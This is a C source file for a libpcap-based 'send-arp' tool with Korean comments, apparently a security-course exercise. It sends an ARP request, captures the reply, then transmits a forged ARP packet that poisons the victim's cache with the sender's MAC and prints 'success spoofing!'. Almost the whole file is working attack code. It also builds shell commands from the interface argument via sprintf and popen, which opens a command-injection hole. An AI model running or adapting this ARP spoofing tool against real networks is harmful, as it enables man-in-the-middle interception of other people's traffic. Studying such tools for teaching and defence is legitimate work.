#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include "arp_struct.h"

#define PROMISCUOUS 1
#define NONPROMISCUOUS 0
#define NORMAL 0
#define ABNORMAL 1

void usage() {
  printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
  printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

struct libnet_ethernet_hdr etherh;
struct libnet_ipv4_hdr* iph;
struct libnet_tcp_hdr* tcph;
struct libnet_arp_hdr arph;
struct libnet_arp_hdr* arph_receive;

// 패킷을 받아들일경우 이 함수를 호출한다.
// packet 가 받아들인 패킷이다.

int get_my_ip_str(char *dev, char *str, int len) {
        FILE* fp;
        char cmdbuf[256];
        sprintf(cmdbuf, "/bin/bash -c \"ifconfig %s\" | grep \"inet \" | awk '{print $2}'\n", dev);
        fp = popen(cmdbuf, "r");
        if (fp == NULL) {
                perror("Fail to fetch mac address\n");
                return EXIT_FAILURE;
        }
        fgets(str, len, fp);
        pclose(fp);
        return EXIT_SUCCESS;
}

int get_my_mac_str(char *dev, char *str, int len) { //  필요없을수도 있음 지울 예정, target ip 주소를 입력받으므로 없어도 되는 함수
        FILE* fp;
        char cmdbuf[256];
        sprintf(cmdbuf, "/bin/bash -c \"ifconfig %s\" | grep '[ ][0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]:[0-9a-zA-Z][0-9a-zA-Z]' | awk '{print $2}'", dev);
        fp = popen(cmdbuf, "r");
        if (fp == NULL) {
                perror("Fail to fetch IPv4 address\n");
                return EXIT_FAILURE;
        }
        fgets(str, len, fp);
        pclose(fp);
        return EXIT_SUCCESS;
}

void request_arp(char* argv[], pcap_t* handle, int status) {
    // entire packet
    u_char request_packet[1500];
    memset(request_packet, 0, sizeof(request_packet));
    char my_ip[20];
    char my_mac[25];

    get_my_ip_str(argv[1], my_ip, sizeof(my_ip));
    get_my_mac_str(argv[1], my_mac, sizeof(my_mac));


    //ethernet packet
    etherh.ether_type = ntohs(ETHERTYPE_ARP);
    sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &etherh.ether_shost[0],&etherh.ether_shost[1],&etherh.ether_shost[2],&etherh.ether_shost[3],&etherh.ether_shost[4],&etherh.ether_shost[5]);
    for(int i = 0; i <6 ;i++)
        etherh.ether_dhost[i] = 0xff;

    memcpy(request_packet, &etherh, sizeof(etherh)); // ether head +

    //arp packet
      arph.arp_htype = ntohs(1);
      arph.arp_ptype = ntohs(0x0800);
      arph.arp_hlen = 6;
      arph.arp_plen = 4;
      arph.arp_opcode = ntohs(1);

      sscanf(argv[2], "%hhd.%hhd.%hhd.%hhd", &arph.target_ip[0],&arph.target_ip[1],&arph.target_ip[2],&arph.target_ip[3]);

      if(status == NORMAL) {
        sscanf(my_ip, "%hhd.%hhd.%hhd.%hhd", &arph.send_ip[0],&arph.send_ip[1],&arph.send_ip[2],&arph.send_ip[3]);
        sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arph.send_mac[0],&arph.send_mac[1],&arph.send_mac[2],&arph.send_mac[3],&arph.send_mac[4],&arph.send_mac[5]);
      }
      else {
        sscanf(argv[3], "%hhd.%hhd.%hhd.%hhd", &arph.send_ip[0],&arph.send_ip[1],&arph.send_ip[2],&arph.send_ip[3]);
        sscanf(my_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arph.send_mac[0],&arph.send_mac[1],&arph.send_mac[2],&arph.send_mac[3],&arph.send_mac[4],&arph.send_mac[5]);
        for(int i = 0; i < 6; i++)
            arph.target_mac[i] = arph_receive->target_mac[i];
      }

      memcpy(request_packet+sizeof(etherh), &arph, sizeof(arph)); // arp head +

      if(pcap_sendpacket(handle, request_packet, sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr)) != 0)
          printf("\nError sending the packet(pcap_sendpacket(packet~) \n");

      return;

}

int main(int argc, char* argv[]) {

  if (argc != 4) {
    usage();
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s (handle)\n", dev, errbuf);
    return -1;
  }

    request_arp(argv, handle, NORMAL);

    struct libnet_ethernet_hdr *ep;
    u_int16_t ether_type;

        // 이더넷 헤더를 가져온다.
    while(true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        ep = (struct libnet_ethernet_hdr *)packet;

        // 프로토콜 타입을 알아낸다.
        ether_type = ntohs(ep->ether_type);

        // 만약 ARP 패킷이라면
        if (ether_type == ETHERTYPE_ARP)
        {
            // ARP 헤더에서 데이타 정보를 출력한다.
            arph_receive = (struct libnet_arp_hdr *)(packet + sizeof(struct libnet_ethernet_hdr));
            printf("\n=============ARP 패킷==============\n");
            printf("Src Address : %d.%d.%d.%d\n", arph_receive->send_ip[0],arph_receive->send_ip[1],arph_receive->send_ip[2],arph_receive->send_ip[3]);
            printf("Dst Address : %d.%d.%d.%d\n", arph_receive->target_ip[0],arph_receive->target_ip[1],arph_receive->target_ip[2],arph_receive->target_ip[3]);
            printf("arp_type(code) : %u\n", ntohs(arph_receive->arp_opcode));

            // MAC print
            printf("==  Source ==\n");
            printf("%02X:%02X:%02X:%02X:%02X:%02X\n",arph_receive->send_mac[0], arph_receive->send_mac[1], arph_receive->send_mac[2], arph_receive->send_mac[3], arph_receive->send_mac[4], arph_receive->send_mac[5]);
            printf("==  Destination ==\n");
            printf("%02X:%02X:%02X:%02X:%02X:%02X\n", arph_receive->target_mac[0], arph_receive->target_mac[1], arph_receive->target_mac[2], arph_receive->target_mac[3], arph_receive->target_mac[4], arph_receive->target_mac[5]);
            printf("\n");
            break;
        }
    }

    request_arp(argv, handle, ABNORMAL);
    printf("\nsuccess spoofing!\n");

  return 0;
}
